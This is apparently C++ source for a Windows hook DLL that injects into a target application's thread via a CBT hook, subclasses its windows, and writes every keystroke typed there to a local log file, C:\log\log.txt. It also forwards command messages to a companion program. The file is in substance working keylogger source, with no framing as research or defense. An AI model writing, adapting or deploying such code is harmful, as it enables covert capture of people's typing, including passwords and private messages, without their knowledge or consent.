#include <windows.h>
#include <fstream>
using namespace std;


char* FileLocation = "C:\\log\\log.txt";
void writekeys(WPARAM wParam);
bool SpecialKeyMapping(WPARAM wParam, FILE *OUTPUT_FILE);


LRESULT CALLBACK WindowProc(HWND hwnd,UINT uMsg,WPARAM wParam,LPARAM lParam);//Window CallBack Procedure


//Initialized Data to be shared with all instance of the dll
#pragma data_seg("Shared")
HWND hTarget=NULL;
HWND hApp = NULL;
int num=0 ;// Number of the subclassed window handle ,for use in the dll
bool done=FALSE;
HINSTANCE hInstance=NULL;
#pragma data_seg()
// Initialised data End of data share


// Uninitialised Data to be shared with all instance of the dll
#pragma bss_seg("Shared1")
HWND hndll[100];  // array to store handles
int form[100] ;  // Forms which we need to subclass
long OldWndHndl[100] ; //array to store old window handles
BOOL blnsubclassed[100];
HHOOK hWinHook;
#pragma bss_seg()

//End Uninitialized data

BOOL WINAPI DllMain(
  HANDLE hinstDLL,  // handle to the DLL module
  DWORD fdwReason,     // reason for calling function
  LPVOID lpvReserved   // reserved
)

{

	switch(fdwReason)
	{
	
	case DLL_PROCESS_ATTACH:
		{
			hInstance=(HINSTANCE)hinstDLL;
		}
		break;

	case DLL_PROCESS_DETACH:
		{

		//	UnSubClass();
		//	UnhookWindowsHookEx(hWinHook);

		}
		break;

	}

return TRUE;

}



//This function wld get all the handles from the Our application and store in in the array
int WINAPI FillHandleArray(HWND hwndSubclass,int intFrmNUm)  
{ 
	
	hndll[num]=hwndSubclass; // fill the array with the handle
    form[num]=intFrmNUm;  //fill the corresponding array for the form number
	blnsubclassed[num]=FALSE;// set the state to not subclassed
	num=num+1;
	return 1;
}// End of the fill array function


// Function to set the original window procedure of each subclassed window
int WINAPI UnSubclass()
{
	int count;
	for(count=0;count<num;count++)
	{
		if((int)hndll[count]>1)
		{
			// might have to switch to SetwindowLongPtr
			SetWindowLong(hndll[count],GWL_WNDPROC,OldWndHndl[count]);   //Set back the old window procedure
		}		
	}	

		return 1;
}//End UnSubclass function



//The CBT hook Proc(Computer Based Training Hook)
LRESULT CALLBACK CBTProc(int nCode,WPARAM wParam,LPARAM lParam)
{


	if (nCode==HCBT_ACTIVATE)  //Called when the application window is activated
	{
	
		if((HWND)(wParam)==hTarget)  //check if the window activated is Our Targer App
		{   
					
			int count;
			for (count=0;count<num;count++)
			{
				if (blnsubclassed[count]==FALSE)
				{	
					if(((int)hndll[count])>1)
					{
						OldWndHndl[count]=SetWindowLong(hndll[count],GWL_WNDPROC,(long)WindowProc);  //Subclass !!!!
					}
										
					blnsubclassed[count]=TRUE;	// Set state as subclassed
				}
			}

		}		
	}
	if (nCode==HCBT_DESTROYWND) //Called when the application window is destroyed
	{

		if((HWND)wParam==hTarget)
			SendNotifyMessage(hApp,WM_APP +1024,(WPARAM)wParam,(LPARAM)lParam);// Send the message  to the vb app
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}//End of the hook procedure

// Get the handles of the Targetwindow and of the Our application
int WINAPI SetHandle(HWND HandleofTarget ,HWND HandleofApp)
{

	hTarget=HandleofTarget;
	hApp=HandleofApp;
	hWinHook=SetWindowsHookEx(WH_CBT,(HOOKPROC)CBTProc,hInstance,GetWindowThreadProcessId(hTarget,NULL));
//	if(hWinHook==NULL)
//		return 0;
//	else
		return 1;

}//End this function
//Window Procedures of the subclassed windows
LRESULT CALLBACK WindowProc(
  HWND hwnd,
  UINT uMsg,
  WPARAM wParam,
  LPARAM lParam
)
{	
	long val;
	int count;
	for(count=0;count<num;count++)
	{
		if(hndll[count]==hwnd)
		{
			val=count;   // this gets us the exact position of this window procedure in the array
		}
	}
	
	long result;
	
	switch(uMsg)
	{
	  case 273:
		if(HIWORD(wParam)==0)
		{
			result=SendNotifyMessage(hApp,WM_APP +1024,(WPARAM)(LOWORD(wParam)),(LPARAM)uMsg);
		}
		break;
	  case WM_KEYDOWN:
		  {
			writekeys(wParam);
		  }
	}

	return CallWindowProc((WNDPROC)OldWndHndl[val],hwnd,uMsg,wParam,lParam);
}//End Procedure


void writekeys(WPARAM wParam)
{
	char ch;			
	FILE *OUTPUT_FILE;
	// a+ option adds to the end of the file without override existing data
	OUTPUT_FILE = fopen(FileLocation, "a+");
	BYTE ks[256];
	GetKeyboardState(ks);
	WORD w;
	if (!SpecialKeyMapping(wParam, OUTPUT_FILE))
	{
	   ToAscii(wParam,0,ks,&w,0);
	   ch =char(w); 
	   fwrite(&ch,1,1,OUTPUT_FILE);
	}
	fclose(OUTPUT_FILE);
}

bool SpecialKeyMapping(WPARAM wParam, FILE *OUTPUT_FILE)
{
	if (LOWORD(wParam)==VK_RETURN)
	 {	
		fprintf(OUTPUT_FILE, "%s", "\n\r");
	 }
	else if (LOWORD(wParam) == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[bksp]");
	else if (LOWORD(wParam) == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "\t");
	else if (LOWORD(wParam) == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[ctrl]");
	else if (LOWORD(wParam) == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[esc]");
	else if (LOWORD(wParam) == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[end]");
	else if (LOWORD(wParam) == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[home]");
	else if (LOWORD(wParam) == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[left]");
	else if (LOWORD(wParam) == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[right]");
	else if (LOWORD(wParam) == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[down]");
	else if (LOWORD(wParam) == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[up]");
	else if (LOWORD(wParam) == VK_CAPITAL)
		fprintf(OUTPUT_FILE, "%s", "[CAPS]");
	else if (LOWORD(wParam) == VK_SHIFT){;}
	
	else 
		return false;
	
	return true;
}